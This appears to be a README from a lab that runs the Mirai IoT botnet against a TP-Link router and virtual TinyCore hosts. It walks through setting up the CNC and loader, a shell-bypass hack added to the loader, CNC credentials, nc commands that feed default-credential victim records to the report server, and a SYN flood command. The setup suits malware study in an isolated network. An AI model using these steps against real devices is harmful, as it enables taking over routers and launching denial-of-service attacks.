# Performing attack

## Experiment 1: real hardware

Though Mirai supports wide range of devices,
there are some requirements:

  * Device is in reachable network (not behind NAT/firewall)
  * Device has telnet (or ssh) daemon binded to interface on reachable network (ex. modem allows telnet access from internet port)
  * Device runs linux-like system and has busybox binary (that includes `cp`, `cat`, `chmod` and either `wget` or `tftp`)
  * Access to busybox/sh can be gained with one of known commands (ex. TD-W8968 needs `echo && sh` hack that is not expected in Mirai and should be added)
  * There is a path with write access
  * Device admin password is known (initial device) or is one from Mirai dictionary

I have used TP-Link TD-W8968 SOHO router/modem as target device. It is based on Broadcom MIPS SoC 
(MIPS-I version 1 (SYSV)), that is one of supported archs. This device fits most of requirements, other can be fixed. 

One of Mirai features is using DNS to connect to CNC. I am using dnsmasq both for dns and tftp server:

  - DNS configuration has only one record: `cnc.loacal` for `192.168.1.11` (see network table from previous section)
  - TFTP root is `/tftp` (`/vagrant/tftp` in VM), directory is created and populated automaticly while provisioning

VM's network is configured to bridge to CISCO (Realtek) network adapter. The target device should be connected to this interface directly or via hub or
switch __before__ starting lab. 

The first step is to install vagrant and vbox (and patch vagrant). This is done manualy with `lab_setup/install_vbox_vagrant.cmd`. After that reboot is required.
Also it is important to make sure Hyper-V is off, otherwise VirtualBox can not run VMs.

After reboot launching `lab_setup/setup.cmd` sets up SSD for VMs and configures CISCO adapter. Now everything is ready to start mirai server with `START build.cmd`.

If build was ok, mirai server VM is configured and running and mirai binaries are compiled and deployed to folders. It is time to turn on target device if it is
not yet on. 

After that trying to access it with telnet: `telnet 192.168.1.1`. (Well `192.168.1.1` is default ip for my TP-Link router, on other routers it may be
necessary to adjust it's ip settings make changes in configurations. If device is on `192.168.1.0/24` subnet, the only change is in `/config/hosts.txt`. If not,
address of mirai server vm should be changed.) 

On my TP-Link after login I get some kind of vendor's restricted shell, that is not much usefull, but with `echo && sh`
it is possible to trick it and run busybox sh shell. Unfortunately mirai's loader does not know about this so I have manualy added it loader (it already tries `enable`
after login command for example).

The next step is starting cnc and loader with `START run.cmd`. CNC server is started on `192.168.1.11:23`, reports server at `192.168.1.11:48101` and loader is connected
to it with a pipe. Reports server first reads records from `/config/hosts` and passes them to the loader. In my case the only record is `192.168.1.1:23 admin:admin`.
Loader receives it and uses to connect to my router. If everything goes ok, we see message `ok` with ip address.

Now connect to CNC with `START cnc.cmd`, login is `mirai` and password is `password`. And `botcount` command should print that one mips host is connected. That means everything
is fine and DDoS (well DoS in this case) can be launched like `syn 192.168.1.10 20`. Wireshark on host machine should display number of TCP SYN packets. 

## Experiment 2: virtual targets

Often it is more convenient to do labs on virtual hardware. Mirai also supports x86 arch, so it's targets can be normal vbox VMs. 

In this experiment bridging is not necessary, because only virtual hosts are used.
But to make it possible to mix experiments, same network setup is used. 

With `START build_vms.cmd` three small VMs with tinycore are build. Provisioning is done with another shell script. Unfortunatly telnetd from tc repository works in
a strange way, so I used debian binary and unpacked it manualy. Well the next problem with telnetd is that it's too complicated for mirai loader and does too many negotiations,
while loader's telnet client is not very RFC-friendly. So I've done some changes to loader to fix it.

The next step is add one of virtual hosts to `/config/hosts.txt` and `START run.cmd`. Bot scanner will take a lot of time, so we can pass other hosts to report server with: 
`vagrant ssh mirai` and `echo -e '\x00\xc0\xa8\x01\x66\x17\x00\x05admin\x05admin' | nc 127.0.0.1 48101` and `echo -e '\x00\xc0\xa8\x01\x67\x17\x00\x05admin\x05admin' | nc 127.0.0.1 48101`.

Againg, starting cnc: `START cnc.cmd` and do `botcount` and some kind of DDoS.



